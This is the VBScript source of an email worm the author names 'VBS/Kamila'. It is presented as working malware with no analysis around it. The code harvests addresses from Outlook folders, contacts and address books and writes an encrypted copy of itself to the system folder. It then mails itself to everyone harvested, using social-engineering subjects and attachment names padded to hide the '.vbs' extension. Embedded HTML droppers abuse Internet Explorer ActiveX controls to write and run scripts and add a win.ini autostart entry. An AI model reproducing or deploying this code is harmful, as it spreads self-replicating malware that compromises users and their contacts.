Option Explicit
On Error Resume Next 'Keine Fehler!!!

Dim wshShell,Outlook, fso
Dim strReg
Dim strCopiedBody
Dim strBeginBody
Dim strEndBody
Dim fileCopied
Dim Recipients
Dim intTotal
Const tempReg="HKLM\Security\Provider\" 'do not change this

Sub Sleep(seconds)
	On Error Resume Next
	Dim a1,a2
	a1=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	a2=a1
	While (a2-a1<seconds)
		a2=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	Wend
End Sub

Sub FillRecipients()
	On Error Resume Next 'Keine Fehler!!!
	Dim i
	Redim Recipients(-1)
	For i=1 To CInt(wshShell.RegRead(strReg & "Recipients\"))
		ReDim Preserve Recipients(UBound(Recipients)+1)
		Recipients(UBound(Recipients))=CStr(wshShell.RegRead(strReg & "Recipients\Item" & i))
	Next
End Sub

Sub EncryptSymbolic(strFile,strKey)
	On Error Resume Next 'Keine Fehler!!!
	Dim strOut,strCh,strChKey,strIn
	Dim out, file
	Dim intCode, intOffset, intUpper, k, i
	
	intOffset=30 'this variable defines the stand-alone offset
	intUpper=125 'not including UNI-characters

	Set file=fso.OpenTextFile(strFile,1)
	Set out=fso.CreateTextFile(Left(strFile,Len(strFile)-3)+"crp",2)
	While Not file.AtEndOfStream
		strIn=file.Read(Len(strKey))
		For i=1 To Len(strIn)
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			intCode=Asc(strCh)+Asc(strChKey)
			if intCode<intOffset Then intCode=intCode+intOffset
			If intCode>intUpper Then intCode=intCode-intUpper
			If intCode=10 Then intCode=126
			If intCode=13 Then intCode=127
		 	out.write(Chr(intCode))
		Next
		out.WriteLine
	Wend
	file.Close
	out.Close
	Set file=Nothing
	Set out=Nothing
End Sub

Sub EncryptNumeric(strFile,strKey)
	On Error Resume Next 'Keine Fehler!!!
	Dim strOut,strCh,strChKey,strIn
	Dim out, file
	Dim intCode,intSize, k, i
                                
	intSize=0
	Set file=fso.OpenTextFile(strFile,1,True,-2)
	
	strOut=Left(strFile,Len(strFile)-3)
	Set out=fso.CreateTextFile(strOut+"crp",True)
	While Not file.AtEndOfStream
		strIn=file.Read(Len(strKey))
		k=Len(strIn)

		For i=1 To k
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			intCode=Asc(strCh) Xor Asc(strChKey)
			out.write(intCode & " ")
			intSize=intSize+Len(CStr(intCode))+1
		Next
		intSize=intSize+2
		out.WriteLine
	Wend
	file.Close
	out.Close
	Set file = Nothing
	Set out = Nothing
End Sub

Sub EncryptRandom(strFile,strKey)
	On Error Resume Next 'Keine Fehler!!!

	Dim strOut,strCh,strChKey,strIn,strIn2
	Dim out, file
	Dim intCode,intOffset, intUpper
	Dim k, i,t
                                
	t=0

	Set file=fso.OpenTextFile(strFile,1)
	
	strOut=Left(strFile,Len(strFile)-3)
	Set out=fso.CreateTextFile(strOut+"crp",2)
	While Not file.AtEndOfStream
		strIn=file.Read(Len(strKey))
		k=Len(strIn)
		strIn2=""
		For i=1 To k
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			intCode=Asc(strCh) Xor Asc(strChKey)
			strIn2=strIn2 & CStr(intCode) & " "
		Next
		intOffset=30
		intUpper=125
		For i=1 to Len(strIn2)
			If t>=Len(strKey) Then t=0
			t=t+1
			strCh=Mid(strIn2,i,1)
			strChKey=Mid(strKey,t,1)
			intCode=Asc(strCh)+Asc(strChKey)
			if intCode<intOffset Then intCode=intCode+intOffset
			If intCode>intUpper Then intCode=intCode-intUpper
			If intCode=10 Then intCode=126
			If intCode=13 Then intCode=127
			out.write(Chr(intCode))
		Next
		out.WriteLine
	Wend
	file.Close
	out.Close
	Set file = Nothing
	Set out = Nothing
End Sub

Sub Expand(strExpand)
	On Error Resume Next 'Keine Fehler!!!
	Redim Preserve Recipients(UBound(Recipients)+1)
	Recipients(UBound(Recipients))=strExpand
End Sub

Function Exists(strAddress)
	On Error Resume Next 'Keine Fehler!!!
	Dim i
	Exists=False
	For i=LBound(Recipients) To UBound(Recipients)
		If strAddress=Recipients(i) Then
			Exists=True
		End If
	Next
End Function

Sub EnumFromFolders()
	On Error Resume Next 'Keine Fehler!!!
	Dim Mapi
	Dim logFolder
	Dim newFolder
	Dim newContact, newRecipient
	Dim i, j, k, m, p
	Const olMailItem=0
	Const olContactItem=2

	Set Mapi = Outlook.GetNamespace("MAPI")
	p=CInt(wshShell.RegRead(strReg & "Recipients\"))
	For i = 1 To Mapi.Folders.Count
		Set logFolder = Mapi.Folders.Item(i)
		For j = 1 To logFolder.Folders.Count
			Set newFolder = logFolder.Folders.Item(j)
			If newFolder.DefaultItemType = olMailItem Then
				For k = 1 To newFolder.Items.Count
					Set newContact = newFolder.Items(k)
					For m = 1 To newContact.Recipients.Count
						Set newRecipient = newContact.Recipients(m)
						If Not Exists(newRecipient.Address) Then
							p=p+1
							wshShell.RegWrite strReg & "Recipients\Item" & p,newRecipient.Address
							Expand newRecipient.Address
						End If
					Next
					If (Len(newContact.BCC) > 0) And (Not Exists(newContact.BCC))  Then
						p=p+1
						wshShell.RegWrite strReg & "Recipients\Item" & p,newContact.BCC
						Expand newContact.BCC
					End If
					If (Len(newContact.CC) > 0) And (Not Exists(newContact.CC)) Then
						p=p+1
						wshShell.RegWrite strReg & "Recipients\Item" & p,newContact.CC
						Expand newContact.CC
					End If
				Next
			ElseIf newFolder.DefaultItemType = olContactItem Then
				For k = 1 To newFolder.Items.Count
					Set newContact = newFolder.Items(k)
					If (Len(newContact.Email1Address) > 0) And (Not Exists(newContact.Email1Address)) Then
						p=p+1
						wshShell.RegWrite strReg & "Recipients\Item" & p,newContact.Email1Address
						wshShell.RegWrite strReg & "Recipients\Name" & p,newContact.FullName
						Expand newContact.Email1.Address
					End If
					If (Len(newContact.Email2Address) > 0) And (Not Exists(newContact.Email2Address)) Then
						p=p+1
						wshShell.RegWrite strReg & "Recipients\Item" & p,newContact.Email2Address
						wshShell.RegWrite strReg & "Recipients\Name" & p,newContact.FullName
						Expand newContact.Email2Address
					End If
					If (Len(newContact.Email3Address) > 0) And (Not Exists(newContact.Email3Address)) Then
						p=p+1
						wshShell.RegWrite strReg & "Recipients\Item" & p,newContact.Email3Address
						wshShell.RegWrite strReg & "Recipients\Name" & p,newContact.FullName
						Expand newContact.Email3Address
					End If
				Next
			End If
		Next
	Next
	wshShell.RegWrite strReg & "Recipients\",p,"REG_DWORD"
	Set Mapi = Nothing
	Set logFolder= Nothing
	Set newFolder=Nothing
	Set newContact = Nothing
	Set newRecipient = Nothing
End Sub

Sub EnumFromWAB()
	On Error Resume Next 'Keine Fehler!!!
	Dim i,j,p
	Dim Mapi,newMapi

	p=CInt(wshShell.RegRead(strReg & "Recipients\"))
	
	Set newMapi=Outlook.GetNameSpace("MAPI")
	newMapi.Logon
	For j = 1 To newMapi.AddressLists.Count
		Set Mapi = Outlook.GetNamespace("MAPI").AddressLists(j)
		For i = 1 To Mapi.AddressEntries.Count
			If Not Exists(Mapi.AddressEntries(i).Address) Then
				p=p+1
				wshShell.RegWrite strReg & "Recipients\Item" & p,Mapi.AddressEntries(i).Address
				wshShell.RegWrite strReg & "Recipients\Name" & p,Mapi.AddressEntries(i)
				Expand Mapi.AddressEntries(i).Address
			End If
		Next
	Next
	wshShell.RegWrite strReg & "Recipients\",p,"REG_DWORD"
	newMapi.Logoff
	Set Mapi=Nothing
	Set newMapi=Nothing
End Sub

Function RetRndKey(intLength)
	Dim i,strKey
	Dim intLow,intHigh

	intLow=48
	intHigh=122

	Randomize Timer
	strKey=""
	For i=1 To intLength
		strKey=strKey & Chr(intLow+(intHigh-intLow+1)*Rnd)
	Next
	RetRndKey=strKey
End Function

Function MakeCopy()
	On Error Resume Next 'Keine Fehler!!!
	Dim fileDll, file1
	Dim intBody, int1, intSize
	Dim strID, strField, strVal
	Dim i, j, intFields
	Dim strKey,strInstKey
	Dim strExt, strAlg, strFile
	Dim strIn, strBody, strCode, strRes
	
	Set fileDll=fso.OpenTextFile(wshShell.RegRead(strReg) & "." & wshShell.RegRead(strReg & "Vars\%DLL_EXT%"),1)
	intBody=CInt(wshShell.RegRead(strReg & "Body"))
	strRes=""
	For i=1 To intBody
		strRes=strRes & fileDll.ReadLine & vbCrLf
	Next
	fileDll.Close
	int1=CInt(wshShell.RegRead(strReg & "Components\Total components"))
	For i=1 To int1
		strID=wshShell.RegRead(strReg & "Components\Component" & i)
		For j=1 To CInt(wshShell.RegRead(strReg & "Fields\Total fields"))
			strField=wshShell.RegRead(strReg & "Fields\Field" & j)
			strVal=wshShell.RegRead(strReg & "Components\" & strID & "\" & strField)
			If strField="KEY" Then
				strVal=RetRndKey(128)
				strKey=strVal
			ElseIf strField="INSTALL_KEY" Then
				strVal=RetRndKey(128)
				strInstKey=strVal
			End If
			strRes=strRes & "'" & strField & ":" & strVal & vbCrLf
		Next
		strRes=strRes & "'<INSTALL>" & vbCrLf
		strExt=wshShell.RegRead(strReg & "Components\" & strID & "\INSTALL_EXT")
		strFile=wshShell.RegRead(strReg & "Components\" & strID & "\Installer path")
		strFile=Left(strFile,Len(strFile)-3) & strExt
		strAlg=wshShell.RegRead(strReg & "Components\" & strID & "\INSTALL_ENC_ALG")
		If LCase(strAlg)<>"none" Then
			Select Case LCase(strAlg)
				Case "symbolic": EncryptSymbolic strFile,strInstKey
				Case "numeric": EncryptNumeric strFile,strInstKey
				Case "random": EncryptRandom strFile,strInstKey
			End Select
			Set file1=fso.OpenTextFile(Left(strFile,Len(strFile)-3) & "crp",1)
			While Not file1.AtEndOfStream
				strRes=strRes & "'" & file1.ReadLine & vbCrLf
			Wend
			file1.Close
			fso.DeleteFile(Left(strFile,Len(strFile)-3) & "crp")
		End If
		strRes=strRes & "'</INSTALL>" & vbCrLf
		strRes=strRes & "'<STREAM>" & vbCrLf
		strExt=wshShell.RegRead(strReg & "Components\" & strID & "\EXTENSION")
		strFile=wshShell.RegRead(strReg & "Components\" & strID & "\")
		strFile=Left(strFile,Len(strFile)-3) & strExt
		strAlg=wshShell.RegRead(strReg & "Components\" & strID & "\ENCRYPTION_ALGORITHM")
		If LCase(strAlg)<>"none" Then
			Select Case LCase(strAlg)
				Case "symbolic": EncryptSymbolic strFile,strKey
				Case "numeric": EncryptNumeric strFile,strKey
				Case "random": EncryptRandom strFile,strKey
			End Select
			Set file1=fso.OpenTextFile(Left(strFile,Len(strFile)-3) & "crp",1)
			While Not file1.AtEndOfStream
				strIn=file1.ReadLine
				strRes=strRes & "'" & strIn & vbCrLf
			Wend
			file1.Close
			fso.DeleteFile(Left(strFile,Len(strFile)-3) & "crp")
		End If
		strRes=strRes & "'</STREAM>" & vbCrLf & vbCrlf & vbCrlf
	Next

	strRes=strRes & vbCrLf & "'</BODY>" & vbCrLf & vbCrLf
	int1=0
	intSize=Int(Len(strRes)/2)
	Set file1=fso.CreateTextFile("C:\destiny.txt",True)
	file1.Write strRes
	file1.Close
	Set file1=fso.OpenTextFile("C:\destiny.txt",1)
	strBeginBody=""
	While int1<intSize
		strIn=file1.ReadLine
		int1=int1+Len(strIn)
		strBeginBody=strBeginBody & strIn & vbCrLf
	Wend
	strEndBody=file1.ReadAll
	file1.Close
	Set fileDll=Nothing
	Set file1=Nothing
	fso.DeleteFile("C:\destiny.txt")
	MakeCopy=strRes
End Function

Function MakeBodyApplet()
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strIn, strBody, strCode, strRes
	
	strBody=strCopiedBody
	Set file1=fso.OpenTextFile(WScript.ScriptFullName,1)
	While Not file1.AtEndOfStream
		strIn=file1.ReadLine
		If UCase(strIn)="'<--CODE_APPLET_DROPPER-->" Then
			strIn=file1.ReadLine
			While UCase(strIn)<>"'<--/CODE_APPLET_DROPPER-->"
				If strIn="'<textarea name=""txtCode"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody & vbCrLf
				Else
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf
				End If
				strIn=file1.ReadLine
			Wend
		End If
	Wend
	file1.Close
	MakeBodyApplet=strRes
	Set file1=Nothing
End Function

Function MakeBodyScriptlet()
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strIn, strBody, strBody2, strRes
	Dim int1
	
	strBody=strBeginBody
	strBody2=strEndBody
	Set file1=fso.OpenTextFile(WScript.ScriptFullName,1)
	While Not file1.AtEndOfStream
		strIn=file1.ReadLine
		If UCase(strIn)="'<--CODE_SCRIPTLET-->" Then
			strIn=file1.ReadLine
			While UCase(strIn)<>"'<--/CODE_SCRIPTLET-->"
				If strIn="'<textarea name=""txtBody"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody
				ElseIf strIn="'<textarea name=""txtBody2"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody2 
				Else
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf
				End If
				strIn=file1.ReadLine
			Wend
		End If
	Wend
	file1.Close
	MakeBodyScriptlet=strRes
	Set file1=Nothing
End Function

Function ReturnMessage()
	On Error Resume Next 'Keine Fehler!!!
	Dim strRes, strSent
	Dim Words,Messages
	Dim int1,int2,int3,i,j
	Words=Array("sequel","WinNT","security","team","my","lovely","sexy", _
				"gift","never","accept","androgony","de facto","de juro","ali baba", _
				"moisturize","make","little","stuff","funky shit","creepper","giddada", _
				"kazakh","Kazakhstan")
	Messages=Array("A new day has come..." & vbCrLf & "Open the door and you hearing your beating." & vbCrLf & "That is nice, isnt't it?", _
				"Wait... Wait..." & vbCrLf & "It's musik!" & vbCrLf & "It's musik?" & vbCrLf & "That's really musik!!!", _
				"Do you deserve it?" & vbCrLf & "What, if yes?" & vbCrLf & "Show - ain't it?", _
				"VBS/Kamila was developed only for educational purpose." & vbCrLf & "The author is no responsible of the damage caused by my (--GIFT--)." _
				& vbCrLf & "Moreover, I have no responsibility of security bugs in MSIE." & vbCrLf & "Don't forget to wish many hapy returns on 24th of December.")
	Randomize Timer
	int1=Int(100*Rnd+1)
	If int1>73 Then
		int2=Int(5*Rnd+1)
		For i=1 To int2
			int3=Int(3*Rnd+5)
			strSent=""
			For j=0 To int3
				strSent=strSent & Words(Int( (UBound(Words)-LBound(Words)+1)*Rnd+LBound(Words) ))
				If j<>int3 Then strSent=strSent & " "
			Next
			strRes=strRes & UCase(Left(strSent,1)) & Mid(strSent,2) & "." & vbCrLf
		Next
	Else
		strRes=Messages(Int( (UBound(Messages)-LBound(Messages)+1)*Rnd+LBound(Messages) ))
	End If
	ReturnMessage=strRes
End Function

Function ReturnAttachmentFilename()
	On Error Resume Next 'Keine Fehler!!!
	Dim strRes
	Dim FileList
	FileList=Array(  "Zoommy_dummy.jpg","Legends_of_porn_#111.avi", _
				"Legends_of_porn_#211.avi","Legends_of_porn #135.avi","Legends_of_porn_#247.mpg", _
				"Jedy_knights_advisor.doc","MSIE_Security_Update_#4043.exe","Androgony.max", _
				"MSIE_Service_Pack_3.exe","Hey_Baby.mp3","Do_you_want_to_have_a_fun.faq","Library_of_porn.mpg", _
				"Creeping.jpg", "Step_by_step_MCSE","Freelove.mp3" ,"Kylie_Minogue.mp3", _
				"Inprise_FAQ.txt","Zigmund_Freud_FAQ_#1.txt","Zigmund_Freud_FAQ_#2.txt")
	Randomize Timer
	strRes=FileList(Int((UBound(FileList)-LBound(FileList)+1)*Rnd+LBound(FileList) )) & "                                                                                                                                           .vbs"
	ReturnAttachmentFilename=strRes
End Function

Function ReturnSubject()
	On Error Resume Next 'Keine Fehler!!!
	Dim strRes
	Dim Subjects
	Subjects=Array("Re: MS Secutiy advisior information","Fw: Recruiting by the way","Kamila congratulates you...", _
				"musiczone.net.de: The hottest from Rammstein","cinema.org.uk: The hottest from Holly Berry","Re: Sorry, for delay", _
				"Unzip and come along with me","Come along with me","Re: Pretty girls net admits you...", _
				"Fw: Due to your latest reply...","The sweetest thing","Job has found you!", _
				"adult_entertainment.net: The hottest 4 you")
	Randomize Timer
	strRes=Subjects(Int( (UBound(Subjects)-LBound(Subjects))*Rnd+LBound(Subjects) ))
	ReturnSubject=strRes
End Function

Function ReturnFrom()
	On Error Resume Next 'Keine Fehler!!!
	Dim strRes
	Dim FromList
	Randomize Timer
	FromList=Array("Rammstein_funs.net","Mozart","Vivaldi","Bach","Jazz yorks","Yamee-yamee team", _
				  "Adult Entertainment","Victim","Richard Vagner","Chopin","Anastacia")
	strRes=FromList(Int( (UBound(FromList)-LBound(FromList))*Rnd+LBound(FromList) ))
	ReturnFrom=strRes
End Function

Sub Spread2EMail()
	On Error Resume Next 'Keine Fehler!!!
	Dim mail1, mail2, mail3
	Dim i, int1, int2
	If intTotal-1 = UBound(Recipients) Then Exit Sub
	Randomize Timer
	Set mail1=Outlook.CreateItem(0)
	Set mail2=Outlook.CreateItem(0)
	Set mail3=Outlook.CreateItem(0)
	For i=intTotal To UBound(Recipients)
		mail1.Recipients.Add Recipients(i)
		mail2.Recipients.Add Recipients(i)
		mail3.Recipients.Add Recipients(i)
	Next
	int1=CInt(wshShell.RegRead(strReg & "Components\DOCInfector\Total files"))
	int2=Int(2*Rnd+2)
	mail1.Attachments.Add fso.GetSpecialFolder(1) & "\KMLCOPY.VBS", , ,ReturnAttachmentFileName()
	mail1.Subject=ReturnSubject()
	mail1.Body=ReturnMessage()
	mail2.Subject=ReturnSubject()
	mail2.HTMLBody = MakeBodyApplet() & vbCrLf & ReturnMessage()
	mail3.Subject=ReturnSubject()
	mail3.HTMLBody = MakeBodyScriptlet() & vbCrLf & ReturnMessage()
	If int1>0 Then
		For i=1 To int2
			mail1.Attachments.Add wshShell.RegRead(strReg & "Components\DOCInfector\File" & Int(int1*Rnd+1))
			mail2.Attachments.Add wshShell.RegRead(strReg & "Components\DOCInfector\File" & Int(int1*Rnd+1))
			mail3.Attachments.Add wshShell.RegRead(strReg & "Components\DOCInfector\File" & Int(int1*Rnd+1))
		Next
	End If
	mail1.Send
	mail2.Send
	mail3.Send
End Sub

Sleep(101)
Set wshShell=WScript.CreateObject("WScript.Shell")
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
Set Outlook=WScript.CreateObject("Outlook.Application")
strReg=wshShell.RegRead(tempReg)
intTotal=CInt(wshShell.RegRead(strReg & "Recipients\"))
strCopiedBody=MakeCopy()
Set fileCopied=fso.CreateTextFile(fso.GetSpecialFolder(1) & "\KmlCopy.vbs",True)
fileCopied.Write strCopiedBody
fileCopied.Close
Call FillRecipients()
Call EnumFromWAB()
Call EnumFromFolders()
Call Spread2EMail()
Outlook.Quit
WScript.DisconnectObject Outlook
WScript.DisconnectObject wshShell
WScript.DisconnectObject fso
Set wshShell=Nothing
Set Outlook=Nothing
Set fso=Nothing
Set fileCopied=Nothing


'<--CODE_APPLET_DROPPER-->
'<textarea name="txtCode" style="display:none">
'</textarea>
'<applet code="com.ms.activeX.ActiveXComponent" style="display:none"></applet> 
'<applet code="com.ms.activeX.ActiveXComponent" style="display:none"></applet> 
'
'<SCRIPT LANGUAGE="JAVASCRIPT"> 
'	a1=document.applets[0]; 
'	a2=document.applets[1];
'
'	function f2()
'	{
'		a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
'		a1.createInstance();
'		a=a1.invoke('createtextfile',ARGS1);
'		str1=txtCode.value;
'		a.write(str1);
'		a.close();
'		a2.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
'		a2.createInstance();
'		a2.invoke('run',ARGS2);
'	}
'	setTimeout("f2()",3000)
'</SCRIPT> 
'
'<SCRIPT LANGUAGE="VBSCRIPT"> 
'ARGS1=Array("C:\Plead.vbs")
'ARGS2=Array("C:\Plead.vbs")
'</SCRIPT>
'<--/CODE_APPLET_DROPPER-->



'<--CODE_SCRIPTLET-->
'<textarea name="txtWinIni" style="display:none">
'
'
'[windows]
'load=
'run=C:\Kamila.hta
'
'
'</textarea>
'<textarea name="txtBody" style="display:none">
'</textarea>
'<textarea name="txtBody2" style="display:none">
'</textarea>
'<object id="WinIni" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object>
'<script language="JavaScript">
'	function WinIni_Drop()
'	{
'		var dirs=new Array('WINDOWS','WIN95','WIN98','WINNT','WIN2000','WINOS','OS95','OS98','Win.95','Win.98','Windows.95','Windows.98','Windows95','Windows98');
'		var i;
'		for (i=0;i<dirs.length;i++)
'		{
'			try {
'			WinIni.Reset();
'			WinIni.Path="C:\\"+dirs[i]+"\\win.ini";
'			WinIni.Doc=txtWinIni.value;
'			WinIni.Write();
'			}
'			catch(e) { }
'		}
'	}
'	function Kamila_Drop()
'	{
'		var crlf=String.fromCharCode(13,10);
'		var strBody, str1;
'		str1=txtBody.value;
'		strBody=crlf+'<textarea name="txtCode" style="display:none">'+crlf;
'		strBody+=str1+crlf+'</textarea>'+crlf;
'		strBody+='<script>'+crlf;
'		strBody+='var fso=new ActiveXObject("Scripting.FileSystemObject");'+crlf;
'		strBody+='var a=fso.CreateTextFile("C:\\\\Kam_drop.vbs");'+crlf;
'		strBody+='var str1=txtCode.value;'+crlf;
'		strBody+='a.write(str1.substr(0,str1.length-2));'+crlf;
'		strBody+='a.close();'+crlf;
'		strBody+='var wsh=new ActiveXObject("WScript.Shell");'+crlf;
'		strBody+='wsh.run("C:\\\\Drop2.hta");'+crlf;
'		strBody+='</s'+'cript>'+crlf;
'		WinIni.Reset();
'		WinIni.Path="C:\\Kamila.hta";
'		WinIni.Doc=strBody;
'		WinIni.Write();
'	}
'	function Drop_Again()
'	{
'		var strBody;
'		var crlf=String.fromCharCode(13,10);
'		strBody=crlf+'<textarea name="txtCode" style="display:none">'+crlf;
'		strBody+=txtBody2.value+crlf+'</textarea>'+crlf;
'		strBody+='<script>'+crlf;
'		strBody+='var fso=new ActiveXObject("Scripting.FileSystemObject");'+crlf;
'		strBody+='var a=fso.OpenTextFile("C:\\\\Kam_drop.vbs",8);'+crlf;
'		strBody+='a.write(txtCode.value);'+crlf;
'		strBody+='a.close();'+crlf;
'		strBody+='var wsh=new ActiveXObject("WScript.Shell");'+crlf;
'		strBody+='wsh.run("C:\\\\Kam_drop.vbs");'+crlf;
'		strBody+='</s'+'cript>'+crlf;
'		WinIni.Reset();
'		WinIni.Path="C:\\Drop2.hta";
'		WinIni.Doc=strBody;
'		WinIni.Write();
'	}
'	WinIni_Drop();
'	Kamila_Drop();
'	Drop_Again();
'</script>
'<--/CODE_SCRIPTLET-->

